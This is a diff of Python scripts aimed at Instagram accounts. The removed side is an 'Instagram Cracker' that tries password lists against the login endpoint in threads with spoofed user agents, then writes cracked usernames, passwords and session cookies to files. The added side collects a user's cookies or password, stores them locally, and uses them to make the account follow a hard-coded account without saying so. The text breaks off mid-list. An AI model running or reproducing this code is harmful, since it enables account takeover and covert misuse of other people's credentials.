@@ -1,389 +1,593 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-"""
-Instagram Cracker - Enhanced Version
-Fixed and optimized with cloning functionality
-Author: BITHIKA
-Version: 2.0
-"""
+# -*- coding:utf-8
 
-import random
-import sys
-import time
-import hashlib
-import uuid
-import urllib.request
-import requests
-import string
-import os
-import threading
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from datetime import datetime 
-# Global variables with proper initialization
-loop = 0
-oks = []
-cps = []
-idz = []
+# jangan di perjual belikan
 
-# Thread-safe locks
-counter_lock = threading.Lock()
-success_lock = threading.Lock()
-
-def clear():
-    """Cross-platform terminal screen clearing"""
+#--------[ DI BUAT OLEH ZORAA DEV ]--------#
+try:
+    import uuid, urllib, hashlib, base64
+    import os, re, sys, json, time, random, requests
+    from rich.panel import Panel
+    from rich.console import Console
+    from rich.tree import Tree
+    from rich import print as printz
+    from database.useragent_instagram import Useragent
+    from database.banner_terminal import Terminal
+    from concurrent.futures import ThreadPoolExecutor
+except(Exception, KeyboardInterrupt) as e:
     try:
-        os.system('cls' if os.name == 'nt' else 'clear')
-    except Exception:
-        # Fallback for systems without clear command
-        print('\n' * 100)
+        from urllib.parse import quote
+        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
+        exit()
+    except(Exception, KeyboardInterrupt) as e:
+        from urllib.parse import quote
+        __import__('os').system(f'xdg-open https://wa.me/6283140199711?text=INSTAGRAM%20ERROR%20%3A%20{quote(str(e))}')
+        exit()
 
-def linex():
-    """Print decorative line separator"""
-    print(f"\033[1;97m{'='*56}")
+dump = []
 
-def generate_device_hash(uid, pw):
-    """Generate device hash for Instagram API"""
-    hash_obj = hashlib.md5()
-    hash_obj.update(f"{uid}{pw}".encode('utf-8'))
-    hex_digest = hash_obj.hexdigest()
-    hash_obj.update(f"{hex_digest}12345".encode('utf-8'))
-    return hash_obj.hexdigest()
-
-def save_success(uid, pw):
-    """Thread-safe function to save successful login"""
-    try:
-        # Try SD card path first
-        output_dir = "/sdcard/XYZ"
-        fallback_dir = "XYZ"
+class Require:
+    def __init__(self) -> None:
+        pass      
         
+    def Kalender(self):
+        struct_time = time.localtime(time.time())
+        hari_indonesia = ['senin','selasa','rabu','kamis','jumat','sabtu','minggu']
+        hari = hari_indonesia[struct_time.tm_wday]
+        tanggal = time.strftime('%d', struct_time)
+        bulan = time.strftime('%B', struct_time)
+        tahun = time.strftime('%Y', struct_time)
+        jam = time.strftime('%H:%M:%S', struct_time)
+        return (hari, tanggal, bulan, tahun, jam)
+        
+    def Convert_Username(self, username, cookies):
+        with requests.Session() as r:
+            try:
+                r.headers.update({
+                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'
+                })
+                response = r.get(f'https://www.instagram.com/{username}/', cookies={'cookie': cookies}).text
+                if 'user_id' in str(response):
+                    return(re.findall('"user_id":"(\d+)"', str(response))[0])
+            except (Exception) as e: pass
+            
+    def Follow_Cok(self, cookies):
+        with requests.Session() as r:
+           try:
+               r.headers.update({
+                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
+                    'x-csrftoken': re.search('csrftoken=(.*?);',str(cookies)).group(1)
+                })
+               response = r.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("48998009803"), cookies={"cookie": cookies})
+           except (Exception) as e: pass
+            
+    def Validasi_Username(self, username):
+       with requests.Session() as r:
+           try:
+               response = r.get("https://i.instagram.com/api/v1/users/web_profile_info/?username={}".format(username), headers = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"}).json()
+               return (
+                   response["data"]["user"]["edge_followed_by"]["count"], 
+                   response["data"]["user"]["edge_follow"]["count"], 
+                   response["data"]["user"]["edge_owner_to_timeline_media"]["count"]
+               )
+           except (Exception) as e: return(None,None,None)
+            
+class Login:
+    def __init__(self) -> None:
+        pass
+        
+    def Login_Akun_Instagram(self):
         try:
-            os.makedirs(output_dir, exist_ok=True)
-            filepath = os.path.join(output_dir, "RANDOM_OK.txt")
-        except (OSError, PermissionError):
-            # Fallback to local directory
-            os.makedirs(fallback_dir, exist_ok=True)
-            filepath = os.path.join(fallback_dir, "RANDOM_OK.txt")
+           Terminal().banner_instagram()
+           Console().print('\n [bold green]01[bold white]. login from cookies instagram \n [bold green]02[bold white]. login from username and password')
+           query = Console().input("\n [bold green]?[bold white] choose : ")
+           if len(query) >0:
+               if query == '01' or query == '1':
+                   try:
+                       self.Cookies_Instagram()
+                   except (Exception) as e:
+                       Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+                       exit()       
+                       
+               elif query == '02' or query == '2':
+                   try:
+                       Terminal().banner_instagram()
+                       Console().print('\n [bold green]• [italic white]silakan masukan username and password, gunakan pemisah <=> untuk username dengan password, pastikan akun tidak chekpoint dan terpasang A2F')
+                       querty = Console().input("\n [bold green]?[bold white] username and password : ")
+                       if len(querty) >0:
+                           try:
+                               self.username = querty.split('<=>')[0]
+                               self.password = querty.split('<=>')[1]
+                               self.Username_And_Password(self.username,self.password)
+                           except (Exception) as e:
+                               Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+                               exit()   
+                       else:
+                           Console().print(f"\n [bold red]•[bold white] Opss, anda tidak memasukan username dan password, masukan dengan benar!")
+                           exit()     
+                   except (Exception) as e:
+                       Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+                       exit()   
+               else:
+                   Console().print(f"\n [bold red]•[bold white] Opss, menu yang anda masukan tidak terdaftar!")
+                   exit()      
+           else:
+               Console().print(f"\n [bold red]•[bold white] Opss, menu yang anda masukan tidak terdaftar!")
+               exit()          
+        except (KeyboardInterrupt, Exception) as e:
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            exit()        
         
-        with open(filepath, "a", encoding='utf-8') as f:
-            f.write(f"{uid}|{pw}\n")
-        
-        # Thread-safe add to success list
-        with success_lock:
-            oks.append(uid)
-            
-    except Exception as e:
-        print(f"\r\033[1;91m[Save Error] Failed to save result: {e}")
-
-def crack(uid, password_list, total_count):
-    """Enhanced Instagram account cracking function"""
-    
-    # Thread-safe counter increment
-    with counter_lock:
-        global loop
-        loop += 1
-    
-    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
-              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
-    
-    try:
-        for pw in password_list:
-            # Display progress
-            color = random.choice(colors)
-            with counter_lock:
-                progress = loop
-                success_count = len(oks)
-                fail_count = len(cps)
-                percentage = (progress / float(total_count) * 100) if total_count > 0 else 0
-            
-            sys.stdout.write(f"\r{color}[CRACKING] {progress} \033[1;92m{success_count}\033[1;97m/\033[1;91m{fail_count} \033[1;97m[\033[1;93m{percentage:.1f}%\033[1;97m]                   ")
-            sys.stdout.flush()
-            
-            # Create session and generate device hash    uid   "#PWD_INSTAGRAM:0:'+str(int(time.time()))+':'+str(pw)
-            session = requests.Session()
-            response = session.get('https://www.instagram.com/accounts/login/')
-            csrftoken = response.cookies.get('csrftoken')
-            time_now = int(datetime.now().timestamp())
-            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{time_now}:{pw}"
-            cookies = {
-            'datr': 'wDF1aOt9UdNuCskTeplHs7Yx',
-            'ig_did': '534026BE-B655-4318-AB86-5CFD617D4D50',
-            'mid': 'aHUxwQALAAEhOjO5lKEpzt85Xu9g',
-            'ig_nrcb': '1',
-            'ps_l': '1',
-            'ps_n': '1',
-            'wd': '1155x773',
-            'rur': '"CCO\\05479957305321\\0541797856743:01fe07c54e37147ebbc67f3a7ff89858d9e72fa0e96320c926f32037994497420ca612e6"',
-            'csrftoken': csrftoken,}
-            headers = {
-            'accept': '*/*',
-            'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7,hi;q=0.6,gu;q=0.5,bn;q=0.4',
-            'content-type': 'application/x-www-form-urlencoded',
-            'origin': 'https://www.instagram.com',
-            'priority': 'u=1, i',
-            'referer': 'https://www.instagram.com/?flo=true',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Google Chrome";v="143.0.7499.147", "Chromium";v="143.0.7499.147", "Not A(Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': UserAgent(),
-            'x-asbd-id': '359341',
-            'x-csrftoken': csrftoken,
-            'x-ig-app-id': '936619743392459',
-            'x-ig-www-claim': 'hmac.AR0ZBluzE5eab1oDGWSBU1s4d6pzUESqf9_kO8JTPMBUVa5I',
-            'x-instagram-ajax': '1031378256',
-            'x-requested-with': 'XMLHttpRequest',
-            'x-web-session-id': 'xwu66r:r3cl82:m1ree6',}
-            data = {
-            'enc_password': enc_password,
-            'caaF2DebugGroup': '0',
-            'isPrivacyPortalReq': 'false',
-            'loginAttemptSubmissionCount': '0',
-            'optIntoOneTap': 'false',
-            'queryParams': '{"flo":"true"}',
-            'trustedDeviceRecords': '{}',
-            'username': uid,
-            'jazoest': '22898',}
-            # Make API request
-            response = session.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
-            wanted = ["ds_user_id", "sessionid"]
-            all_cookies = session.cookies.get_dict()
-            extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
-            # Check response
-            if 'sessionid' in extracted:
-                cookie_str = "; ".join(f"{k}={v}" for k, v in extracted.items())
-                print(f"\r\033[1;92m [✓ SUCCESS] {uid} | {pw}")
-                print("Cookies:", cookie_str)
-                open("/sdcard/SUMON_INS_IDS.txt","a").write(uid+"|"+pw+"|"+cookie_str+"\n")
-                oks.append(uid)
-                return True
-            elif 'challenge_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHALLENGE] {uid} | {pw}")
-                continue
-            elif 'checkpoint_required' in response.text:
-                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
-                open("/sdcard/SUMON_INS_CP.txt","a").write(uid+"|"+pw+"\n")
-                cps.append(uid)
-                continue
+    def Cookies_Instagram(self):
+        try:
+            Terminal().banner_instagram()
+            Console().print('\n [bold green]• [italic white]silakan masukan cookies instagram, pastikan akun tidak chekpoint dan terpasang A2F')
+            cookies = Console().input("\n [bold green]?[bold white] cookies instagram  : ")
+            if len(cookies) >0:
+                self.username, self.fullname = self.Validasi_Cookies(cookies)
+                with open('.cookie_instagram.json', 'w') as wr:
+                    wr.write(json.dumps({
+                        "Cookie": cookies,
+                    }))
+                    wr.close()
+                Require().Follow_Cok(cookies)
+                Console().print(f'\n [bold green]• [italic white]selamat datang [bold green]{self.username}/{self.fullname}[italic white], silakan jalankan ulang [bold green]python Run.py')
+                exit()
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
-                continue
+                Console().print(f"\n [bold red]•[bold white] Opss, anda tidak memasukan cookies instagram!")
+                exit()
+        except (KeyboardInterrupt, Exception) as e:
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            exit()     
+            
+    def Username_And_Password(self, username, password):
+        try:
+            byps = requests.Session()
+            app_instagram = {'signed_body': 'SIGNATURE'+str(json.dumps({'id': str(uuid.uuid4()), "server_config_retrieval":"1","experiments":"ig_android_fci_onboarding_friend_search,ig_android_device_detection_info_upload,ig_android_sms_retriever_backtest_universe,ig_android_direct_add_direct_to_android_native_photo_share_sheet,ig_growth_android_profile_pic_prefill_with_fb_pic_2,ig_account_identity_logged_out_signals_global_holdout_universe,ig_android_login_identifier_fuzzy_match,ig_android_reliability_leak_fixes_h1_2019,ig_android_video_render_codec_low_memory_gc,ig_android_custom_transitions_universe,ig_android_push_fcm,ig_android_show_login_info_reminder_universe,ig_android_email_fuzzy_matching_universe,ig_android_one_tap_aymh_redesign_universe,ig_android_direct_send_like_from_notification,ig_android_suma_landing_page,ig_android_direct_main_tab_universe,ig_android_session_scoped_logger,ig_android_accoun_switch_badge_fix_universe,ig_android_smartlock_hints_universe,ig_android_black_out,ig_android_account_switch_infra_universe,ig_android_video_ffmpegutil_pts_fix,ig_android_multi_tap_login_new,ig_android_caption_typeahead_fix_on_o_universe,ig_android_save_pwd_checkbox_reg_universe,ig_android_nux_add_email_device,ig_android_direct_remove_view_mode_stickiness_universe,ig_username_suggestions_on_username_taken,ig_android_analytics_accessibility_event,ig_android_ingestion_video_support_hevc_decoding,ig_android_account_recovery_auto_login,ig_android_feed_cache_device_universe2,ig_android_sim_info_upload,ig_android_mobile_http_flow_device_universe,ig_account_recovery_via_whatsapp_universe,ig_android_hide_fb_button_when_not_installed_universe,ig_android_targeted_one_tap_upsell_universe,ig_android_gmail_oauth_in_reg,ig_android_native_logcat_interceptor,ig_android_hide_typeahead_for_logged_users,ig_android_vc_interop_use_test_igid_universe,ig_android_reg_modularization_universe,ig_android_phone_edit_distance_universe,ig_android_device_verification_separate_endpoint,ig_android_universe_noticiation_channels,ig_smartlock_login,ig_android_account_linking_universe,ig_android_hsite_prefill_new_carrier,ig_android_retry_create_account_universe,ig_android_family_apps_user_values_provider_universe,ig_android_reg_nux_headers_cleanup_universe,ig_android_device_info_foreground_reporting,ig_android_device_verification_fb_signup,ig_android_onetaplogin_optimization,ig_video_debug_overlay,ig_android_ask_for_permissions_on_reg,ig_assisted_login_universe,ig_android_display_full_country_name_in_reg_universe,ig_android_security_intent_switchoff,ig_android_device_info_job_based_reporting,ig_android_passwordless_auth,ig_android_direct_main_tab_account_switch,ig_android_modularized_dynamic_nux_universe,ig_android_fb_account_linking_sampling_freq_universe,ig_android_fix_sms_read_lollipop,ig_android_access_flow_prefill"})),'ig_sig_key_version': '4'}
+            response = byps.get('https://www.instagram.com/', data = app_instagram, allow_redirects=True)
+            headers = {
+                'Host': 'www.instagram.com',
+                'vary': 'Accept-Encoding',
+                'x-fb-debug':'X+2SLtmnrCBfsBDb/pVlP8IRXmPriN3g+iTxoPj6Ol2jUJz5zs8I0ghgR7yekWJhRwO06oxty5Ba+4h9P8vD2Q==',
+                'content-length': str(len(("&").join([ "%s=%s" % (name, value) for name, value in app_instagram.items() ]))),
+                'x-ig-app-id': '1217981644879628',
+                'x-instagram-ajax': '1011794706',
+                'user-agent': 'Instagram 63.0.0.17.94 Android (31/10; 360dpi; 1080x2326; Vivo; V2020CA; V1950A; qcom; id_ID; 253447817)',
+                'sec-ch-ua-mobile': '?0',
+                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+                'x-asbd-id': '129477',
+                'dpr': '2',
+                'x-csrftoken': re.search('{"csrf_token":"(.*?)"', str(response.text)).group(1),
+                'x-requested-with': 'XMLHttpRequest',
+                'accept': '*/*',
+                'origin': 'https://www.instagram.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-user': '0',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://www.instagram.com/accounts/onetap/?next=%2F&hl=en',
+                'accept-encoding': 'gzip, deflate',
+                'accept-language': 'en-US,id-ID,id;q=0.9',
+                'connection': 'close',
+                'range':'bytes=0-2048'
+            }
+            payload = {
+                'username': username,
+                'enc_password': '#PWD_INSTAGRAM_BROWSER:0:{}:{}'.format(int(time.time()),password),
+                'optIntoOneTap': False,
+                'queryParams': '{}',
+                'stopDeletionNonce': '',
+                'trustedDeviceRecords': {}
+            }
+            response2 = byps.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', data = payload, headers = headers, allow_redirects=True).text
+            if 'userId' in str(response2):
+               try: cookies = (';'.join(['%s=%s'%(name, value) for name, value in byps.cookies.get_dict().items()]))
+               except (Exception) as e: cookie = (None)
+               Console().print(f'\n [bold green]• [italic white]cookies instagram : [bold green]{cookies}')
+               if len(cookies) >0:
+                   self.username, self.fullname = self.Validasi_Cookies(cookies)
+                   with open('.cookie_instagram.json', 'w') as wr:
+                       wr.write(json.dumps({
+                           "Cookie": cookies,
+                       }))
+                       wr.close()
+                   Require().Follow_Cok(cookies)
+                   Console().print(f'\n [bold green]• [italic white]selamat datang [bold green]{self.username}/{self.fullname}[italic white], silakan jalankan ulang [bold green]python Run.py')
+                   exit()
+               else:
+                   Console(width = 65, style = "bold grey50").print(Panel(f"[italic white]Opss, kami tidak dapat mengakses cookie anda, perkiraan cookie [bold yellow]checkpoint[bold grey50]/[bold red]Invalid!", title = f"[bold white]• [bold red]Eror 404 [bold white]•"))
+                   exit()
+            elif 'two_factor_required' in str(response2):
+                Console().print(f"\n [bold red]•[bold white] [italic white]Opss, kami tidak dapat mengakses akun anda, akun anda terpasang [bold red]A2F!")
+                exit()
+            elif 'challenge_required' in str(response2):
+                Console().print(f"\n [bold red]•[bold white] [italic white]Opss, kami tidak dapat mengakses akun anda, akun anda [bold yellow]Chekpoint!")
+                exit()
+            elif 'ip_block' in str(response2):
+                Console().print(f"\n [bold red]•[bold white] Opss, ip keblokir sipakan mode pesawat dahulu 5 detik!")
+                exit()
+            else:
+                Console().print(f"\n [bold red]•[bold white] Opss, username atau password yang anda masukan salah!")
+                exit()
+        except (KeyboardInterrupt, Exception, requests.exceptions.ConnectionError, requests.exceptions.TooManyRedirects) as e:
+            Console().print(f"\n [bold red]•[bold white] {str(e).title()}!")
+            exit()   
+        
+    def Validasi_Cookies(self, cookies):
+        with requests.Session() as r:
+            r.headers.update({
+                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
+            })
+            response = r.get('https://i.instagram.com/api/v1/users/{}/info/'.format(re.search('ds_user_id=(\d+)',str(cookies)).group(1)), cookies = {
+                'cookie': cookies
+            })
+            self.payload = json.loads(response.text)
+            if '\'username\':' in str(self.payload):
+                self.username = self.payload['user']['username']
+                self.fullname = self.payload['user']['full_name']
+                return(self.username, self.fullname)
+            else:
+                Terminal().clear_terminal_size()
+                Console().print(f"\n [bold red]•[bold white] Opss, cookie anda kedaluarsa/spam silakan cek akun anda atau ganti tumbal!")
+                time.sleep(3.5)
+                self.Login_Akun_Instagram()
                 
-    except requests.exceptions.Timeout:
-        #print(f"\r\033[1;91m [Timeout] {uid} - Request timed out")
-        return False
-    except requests.exceptions.ConnectionError:
-        time.sleep(5)
-        return False
-    except requests.exceptions.RequestException as e:
-        #print(f"\r\033[1;91m [Request Error] {uid} - {str(e)[:50]}")
-        return False
-    except KeyboardInterrupt:
-        print(f"\r\033[1;93m [Interrupted] User stopped the process")
-        raise
-    except Exception as e:
-        #print(f"\r\033[1;91m [Unexpected Error] {uid} - {str(e)[:50]}")
-        return False
-    
-    return False
-
-def UserAgent():
-    rr=random.randint
-    rc=random.choice
-    andro=rc(['24/7.0','26/8.0.0','23/6.0.1','22/5.1.1','21/5.0.1','21/5.0.2','25/7.1.1','19/4.4.4','21/5.0','19/4.4.2','27/8.1.0','28/9','29/10','26/9','29/10','30/11','25/7.1.2'])
-    dpis=rc(['320dpi','640dpi','213dpi','480dpi','420dpi','240dpi','280dpi','160dpi','560dpi','540dpi','272dpi','360dpi','720dpi','270dpi','450dpi','600dpi','279dpi','210dpi','180dpi','510dpi','300dpi','454dpi','314dpi','288dpi','401dpi','153dpi','267dpi','345dpi','493dpi','340dpi','604dpi','465dpi','680dpi','256dpi','290dpi','432dpi','273dpi','120dpi','200dpi','367dpi','419dpi','306dpi','303dpi','411dpi','195dpi','518dpi','230dpi','384dpi','315dpi','293dpi','274dpi','235dpi'])
-    pxl=rc(['720x1280','1440x2560','1440x2768','1280x720','1280x800','1080x1920','540x960','1080x2076','1080x2094','1080x2220','480x800','768x1024','1440x2792','1200x1920','720x1384','1920x1080','720x1369','800x1280','720x1440','1080x2058','600x1024','720x1396','2792x1440','1920x1200','2560x1440','1536x2048','720x1382','1080x2113','1080x2198','1080x2131','720x1423','1080x2069','720x1481','1080x2047','1080x2110','1080x2181','1080x2209','1080x2180','1080x2020','1080x2095','1440x2723','1080x2175','720x1365','1440x2699','1080x2218','2699x1440','1440x2907','1080x2257','720x1370','1080x2042','720x1372','1080x2200','1080x2186','720x1361','1080x2024','1080x2006','720x1402','1440x2831','720x1454','1080x2064','1440x2933','720x1411','720x1450','1440x2730','1080x2046','2094x1080','540x888','1440x2759','1080x2274','1080x2178','1440x2706','720x1356','720x1466','1440x2900','2560x1600','1080x2038','1600x2452','1080x2129','720x1422','720x1381','1080x2183','1080x2285','800x1216','1080x2216','1080x2168','1080x2119','1080x2128','1080x2273','2274x1080','1080x2162','1080x2164','2076x1080','1024x768','1080x2173','1440x2845','1080x2134','720x1379','1440x2838','1080x2139','2131x1080','1440x2744','1080x2192','720x1406','1440x2960','1080x2029','2042x1080','1080x2212','1406x720','1080x2288','2047x1080','1080x2051','720x1398','1280x736','1382x720','720x1353','1080x2050','1080x2028','1080x2256','2711x1440','2175x1080','1080x2281','2560x1492','1440x2923','1200x1845','1080x2189','1080x2002','1440x2711','2110x1080','960x540','1080x2033','2200x1080','720x1452','720x1480','1440x2735','720x1472','1080x2277','1080x2169','2874x1440','1600x2560','1080x2151','2218x1080','1080x2182','720x1468','1440x2898','1080x2011','1080x2201','720x1380','1080x2287','2069x1080','1200x1836','2046x1080','720x1439','2058x1080','2182x1080','720x1399','1080x2282','1440x2721','1080x2324','720x1432','1080x2165','1080x2150','1080x2156','1080x1872','1440x3048','1532x2560','720x1355','720x1390','720x1476','720x1410','1080x2032','720x1437','1440x2682','1440x2921','1080x2270','1080x2160','720x1446','1200x1848','1440x2874','1080x2309','1080x2174','1440x2867','1080x2060','1080x2196','1080x2401','1536x1922','1080x2280','1080x2123','720x1435','1440x2927','1080x2276','720x1448','720x1469','720x1344','1080x2187','540x937','1440x3028','1080x2184','1440x2718','1080x2326','840x1834','1440x2935','1440x2880','1440x2892','2048x2048','1080x2195','1080x2322','720x1419','987x1450','1080x2092','1440x3047','720x1358','1080x2136','720x1357','1080x2093','720x1477','1080x2312','1080x2361','720x1341','720x1507','1080x2172','720x1337','1080x2177','1080x2125','1440x2891','1600x2434','720x1394','1080x2159','720x1387','1080x2166','1080x2154','1080x2147','1440x2747','1080x2105','1440x2911','720x1473','1080x2055','1080x2265','720x1436','1080x2190','1600x2526','720x1373','720x1415','1080x2249','1080x2254','720x1455','1440x3040','1080x2149','720x1385','1440x3036','1080x2111','1440x2904','720x1442','720x1377','1080x2307','1080x2327','1080x2141','1080x2025','720x1430','720x1375','1080x2283','1440x2779','1080x2321','1080x2268','1440x2758','1752x2698','1080x2267','1200x1856','1440x2756','720x1464','1080x2234','1080x2171','1080x2155','720x1463','1080x2122','720x1467','1080x2264','720x1349','1440x2999','720x1458','1080x2015','720x1431','1242x2208','1080x2185','1080x2148','1080x2163','1440x2780','720x1445','1080x2146','1200x1916','720x1502','1200x1928','720x1506','720x1424','720x1465','720x1420','1080x2176','720x1521','1080x2315','1080x2400','720x1471','1080x2157','1600x2458','1080x2067','1080x2191','1080x2271','720x1407','800x1208','1080x2087','1080x2199','578x1028','720x1485','540x879','1080x2179','720x1555','810x1598','720x1378','1200x1897','720x1395','720x1459','900x1600','1080x2275','1440x2733'])
-    basa=rc(['ru_RU','en_GB','uk_UA','en_US','de_DE','it_IT','ru_UA','ar_AE','tr_TR','lv_LV','th_TH','fr_FR','sr_RS','hu_HU','bg_BG','pt_PT','pt_BR','es_ES','en_IE','nl_NL','fr_CH','de_CH','es_US','fr_CA','ru_BY','en_PH','en_AU','hy_AM','fa_IR','de_AT','cs_CZ','ru_KZ','en_CA','fr_BE','az_AZ','en_NZ','en_ZA','es_LA','ru_KG','pl_PL','es_MX','ro_RO','el_GR','iw_IL','in_ID','ga_IE','en_IN','ar_SA','ka_GE','es_CO','es_SV','hr_HR','ar_JO','es_PE','it_SM','ar_AR','en_SE','nb_NO','sk_SK','bs_BA','nl_BE','uz_UZ','sl_SI','es_CL'])
-    kode=rc(['104766893','104766900','102221278','104766888','105842053','93117670','94080607','96794592','102221279','100986894','ru_RU','94080606','103516660','98288242','103516666','103516653','uk_UA','96794590','100986893','102221277','95414344','99640920','99640911','96794591','ru_UA','99640905','100986890','107092313','99640900','93117667','100521966','90841939','98288239','89867440','105842051','de_DE','96794584','105842050','en_US','pt_PT','109556223','107092318','en_GB','108357722','112021130','107092322','119104798','108357720','119104802','112021131','100986892','113249569','107104231','fr_FR','pt_BR','109556226','116756948','113249553','113249561','110937441','118342010','120662545','117539703','119875222','110937448','121451799','115994877','108357718','120662547','107608058','122206624','95414346','107092308','112021128','90841948','119875229','117539698','120662550','en_NZ','123103748','91882538','121451810','91882537','118342006','113948109','122338251','110937453','es_US','118342005','121451793','109556219','119875225','en_CA','109556220','117539695','115211358','91882539','119104795','89867442','94080603','164094539','175574628','185203690','188791648','188791674','187682694','188791643','177770724','192992577','180322810','195435560','196643820','196643821','188791637','192992576','196643799','196643801','196643803','195435546','194383411','197825254','197825260','197825079','171727793','197825112','197825012','197825234','179155086','192992563','197825268','166149669','192992565','198036424','197825223','183982969','199325909','199325886','199325890','199325911','197825118','127049003','197825169','197825216','197825127','200395960','179155096','199325907','200396014','188791669','197825133','170693926','200396005','171727780','201577064','201576758','201577192','201775949','201576944','201775970','143631574','126223520','201775951','167338518','144612598','170693940','201775813','200395971','201775744','201775946','202766609','145652094','202766591','202766602','203083142','179155088','202766608','199325884','180322802','202766603','195435547','165030894','201576967','201775904','194383424','197347903','202766610','185203693','201576898','204019468','187682682','204019456','201775901','204019471','204019454','204019458','202766601','204019452','173238721','204019466','148324036','202766581','158441904','201576903','205280538','205280529','201576813','173238729','141753096','205280531','163022072','201576887','163022088','141753091','148324051','205280528','154400383','205280537','201576818','157405371','205858383','201576811','165031093','187682684','145652090','206670917','185203686','192992561','183982986','206670927','150338061','183982962','127049016','175574603','155374054','205858247','135374896','206670920','169474958','206670926','160497905','161478672','192992578','206670929','131223243','206670916','142841919','187682681','171727795','151414277','206670922','160497915','207505137','165030898','208061741','208061688','208180365','208061674','197825052','147375133','208061744','196643798','208061725','122338247','157536430','208061728','209143963','208727155','209143726','205280539','209143903','209143970','181496409','208061739','209143957','210180522','210180512','209143881','209143712','180322805','210180521','195435561','210370119','210180523','210180493','175574596','210180510','210180480','210180513','210180517','176649504','177770663','210180479','211114117','210908379','206670921','211114134','183982943','211399345','211399342','211399332','201775962','211574187','211574249','210180519','167338559','185203649','124583960','211399337','211399335','197825163','166149717','211399336','212063371','211399329','209143954','210180482','168361634','212214017','209143867','211399341','211399340','212214027','195435510','122338243','139237670','152367502','212676872','212676898','212676875','212676895','212676901','209823384','212676869','196643822','212676878','213367980','213368005','212676886','213558743','209143913','212214039','158441917','174081672','213558750','201775966','188791681','185203705','143631575','161478664','214245350','161478663','212676881','213558770','214245346','138226752','214245221','214245182','214245206','214245218','214245354','214245295','214245199','214245304','214245280','214446313','214245187','214245288','214139002','202766605','214245319','214646783','158441914','215246048','195435544','208061677','215464400','128676146','215464389','215464385','215464390','215464398','182747397','215464393','216233197','201775791','216817344','215464395','216817286','185203642','164094529','216817305','215464401','162439029','215464382','216817280','216817331','214330969','216817299','216817357','217948981','217948980','217948956','217948959','217948968','216817296','217948952','217948982','216817269','219308759','219308726','182747387','219308721','219308754','219308763','176649435','183982982','219909486','127049038','219308730','221134012','221134032','221134009','221134037','194383426','221134029','221134005','221134018','145652093','225283632','165031108','225283625','224652582','139906580','225283628','225283624','226142579','225283634','225283631','226493211','225283623','185203672','156514151','218793478','225283621','227299063','225283627','227299064','227299021','227299027','227544546','227299041','227299060','227299012','228970707','228970705','227299005','228970687','228970683','228970694','228970710','228970689','160497904','195435540','129611419','229783842','230291708','228970681','148324047','230877709','231192211','230877674','230877705','230877678','211399328','209143896','230877713','194383428','230877689','221134002','231457747','208061721','230877671','230877668','232868027','232088496','185203706','232868005','232867964','232868001','232868015','232868031','232867959','232868009','164094526','232867941','234041364','182747399','232868024','232867949','234847239','234847238','234847234','162439040','234847229','234847230','181496427','234847240','232867993','195435558','232867967','232867997','234847227','235871830','221133998','236572344','236572377','153386780','236572337','236572349','236572372','234847226','236572383','237507050','238093993','238093948','238093954','238093999','238093982','239490565','239490555','238093946','238093966','239490563','239490550','239974660','240726416','239490568','240726484','240726452','239490551','239490548','240726426','240726476','240726491','240726471','241043882','241114613','236572331','241267273','240726407','241456456','241267278','241267269','241114619','241456445','241456451','242168941','242168928','242168931','242168939','242168925','240726436','242375239','144722090','242168935','242290370','157405369','242168933','242290355','242703240','242807362','242168923','242168943','242991209','243646252','243646269','242991200','243711120','243646267','243711093','243975802','243646263','243646248','243646255','244167578','128676156','194383413','243975835','244390417','244390338','245196084','245196061','240726392','245196055','243646273','245196082','245196063','245196070','245666450','245466705','245870319','245870301','2458703